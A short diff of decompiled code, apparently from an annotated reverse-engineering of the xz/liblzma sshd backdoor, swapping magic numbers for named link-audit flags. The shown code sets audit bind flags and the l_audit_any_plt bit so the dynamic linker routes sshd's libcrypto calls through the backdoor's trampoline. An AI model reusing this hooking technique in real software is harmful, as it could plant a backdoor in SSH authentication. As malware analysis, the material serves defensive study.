@@ -887,7 +887,7 @@ LAB_00106bf0:
     auditstate_snapshot = *resolved_count_ptr;
     (hooks_data->ldso_ctx).sshd_auditstate_bindflags_ptr = resolved_count_ptr;
     (hooks_data->ldso_ctx).sshd_auditstate_bindflags_old_value = auditstate_snapshot;
-    *resolved_count_ptr = 2;
+    *resolved_count_ptr = LA_FLG_BINDFROM;
     // AutoDoc: Flip sshd’s `l_audit_any_plt` bit so `_dl_audit_symbind_alt` starts calling our symbind trampoline for every sshd→libcrypto PLT.
     audit_slot_byte = (byte *)(hooks_data->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
     *audit_slot_byte = *audit_slot_byte | (hooks_data->ldso_ctx).link_map_l_audit_any_plt_bitmask;
@@ -896,7 +896,7 @@ LAB_00106bf0:
     (hooks_data->ldso_ctx).libcrypto_auditstate_bindflags_ptr = resolved_count_ptr;
     (hooks_data->ldso_ctx).libcrypto_auditstate_bindflags_old_value = auditstate_snapshot;
     audit_ifaces_slot_ptr = &(hooks_data->ldso_ctx).hooked_audit_ifaces;
-    *resolved_count_ptr = 1;
+    *resolved_count_ptr = LA_FLG_BINDTO;
     audit_ifaces_zero_cursor = audit_ifaces_slot_ptr;
     for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
       *(u32 *)&audit_ifaces_zero_cursor->activity = 0;
